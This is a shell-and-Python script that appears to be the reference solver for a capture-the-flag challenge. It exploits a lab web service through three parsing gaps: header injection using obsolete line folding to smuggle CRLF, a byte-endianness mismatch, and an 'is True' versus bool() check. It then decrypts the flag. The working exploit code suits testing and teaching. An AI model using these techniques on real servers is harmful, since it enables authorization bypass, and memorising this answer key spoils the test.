#!/usr/bin/env bash
set -euo pipefail
HOST="${HOST:-target}"; PORT="${PORT:-8297}"; FLAGS_PATH="${FLAGS_PATH:-/app/flags.txt}"
python3 - "$HOST" "$PORT" <<'PY' > "$FLAGS_PATH"
import hashlib, json, socket, struct, sys
from urllib.request import Request, urlopen
host, port = sys.argv[1], sys.argv[2]
base = f"http://{host}:{port}"
req = Request(base + "/api/session", data=b"{}", method="POST")
sid = json.loads(urlopen(req, timeout=5).read())["session"]
# Gap A: splitlines vs split('\n'). "admin\r\nuser": split sees admin\r, splitlines sees admin
# A literal CRLF inside a header value is illegal per RFC 7230 and rejected by
# http.client (and curl); deliver it via HTTP obsolete line folding (RFC 7230
# 3.2.4) over a raw socket so the parsed header value still contains \r\n.
def raw_roster_request(host, port, sid):
    req_bytes = (
        f"POST /api/roster HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"X-Session: {sid}\r\n"
        f"X-Roster: admin\r\n"
        f" user\r\n"
        f"Content-Length: 0\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode("latin-1")
    s = socket.create_connection((host, int(port)), timeout=5)
    s.sendall(req_bytes)
    resp = b""
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        resp += chunk
    s.close()
    return resp
resp = raw_roster_request(host, port, sid)
roster_body = resp.split(b"\r\n\r\n", 1)[1]
hex_a = json.loads(roster_body)["fragment"]
# Gap B: struct endianness. b'\x00\xc8': LE=51200, BE=200
req = Request(base + "/api/verify", data=b"\x00\xc8",
              headers={"X-Session": sid}, method="POST")
hex_b = json.loads(urlopen(req, timeout=5).read())["fragment"]
# Gap C: is True vs bool(x). JSON 1 -> int 1. 1 is True -> False, bool(1) -> True.
body = json.dumps({"authorized": 1}).encode()
req = Request(base + "/api/authorize", data=body,
              headers={"X-Session": sid, "Content-Type": "application/json"}, method="POST")
hex_c = json.loads(urlopen(req, timeout=5).read())["fragment"]
key = hashlib.sha256((hex_a + hex_b + hex_c).encode()).digest()[:32]
req = Request(base + "/api/admin", headers={"X-Session": sid})
payload = urlopen(req, timeout=5).read()
encrypted = payload[4:]  # strip \x7fENC prefix
flag = bytes(b ^ key[i % len(key)] for i, b in enumerate(encrypted)).decode()
print(flag)
PY
